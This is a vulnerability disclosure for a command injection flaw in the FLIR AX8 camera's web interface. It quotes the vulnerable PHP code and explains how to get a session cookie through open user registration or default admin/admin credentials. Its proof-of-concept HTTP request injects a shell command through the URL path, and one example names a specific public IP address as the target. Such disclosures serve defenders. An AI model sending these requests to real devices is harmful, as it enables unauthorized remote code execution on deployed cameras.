# Command injection vulnerability in subscribe_to_alarm() in FLIR AX8

### Description

Command injection vulnerability in /usr/www/application/models/subscriptions.php  in FLIR AX8 up to 1.46.16 allows attackers to run arbitrary commands via the function subscribe_to_spot()

### Note:

This vulnerability is a backend issue that requires obtaining cookies. It  can exploit the unauthorized access vulnerability for arbitrary user  registration found at /tools/test_login.php?action=register. After  registering a new user, cookies can be obtained to achieve RCE (Remote  Code Execution). 

Also.Under normal circumstances, it has a weak password vulnerability with  default account credentials being 'admin' for both user and password too.  You can also obtain a cookie through this method.

![image-20250525235244127](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505252352272.png)

`subscriptions.php`

```php
private function execute_subscription_command($command, $subscription)
{
    shell_exec("echo " . $command . ":" . $subscription . " > " . $this->named_pipe);
}
```

![image-20250525235502223](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505252355316.png)

```php
private function subscribe_to_alarm($id)
{
    $subscription = ".resmon.items." . $id . ".trigged";
    $this->execute_subscription_command("add", $subscription);
}
```

### POC

```
GET /home/subscribe/alarm/;ls>test.txt; HTTP/1.1
Host: XXXXXX
Cookie: PHPSESSID=XXXXXXX
```

For example

- this cookie must be changed

```
GET /home/subscribe/alarm/;ls>test.txt; HTTP/1.1
Host: 222.103.211.89:8004
Cookie: PHPSESSID=XXXXXXXX
```



![image-20250525235929843](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505252359104.png)

![image-20250525235908862](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505252359003.png)